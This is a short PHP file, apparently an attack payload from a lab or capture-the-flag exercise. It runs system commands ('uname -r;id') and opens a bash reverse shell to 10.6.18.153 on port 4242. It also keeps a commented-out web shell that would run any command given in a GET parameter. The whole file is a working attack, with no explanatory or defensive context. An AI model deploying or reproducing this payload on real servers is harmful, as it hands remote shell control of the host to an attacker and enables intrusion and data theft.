<?php
//if (isset($_GET['command'])) {
//    exec($_GET['command']);
//}
exec("uname -r;id");
exec("/bin/bash -c 'sh -i >& /dev/tcp/10.6.18.153/4242 0>&1'");
?>
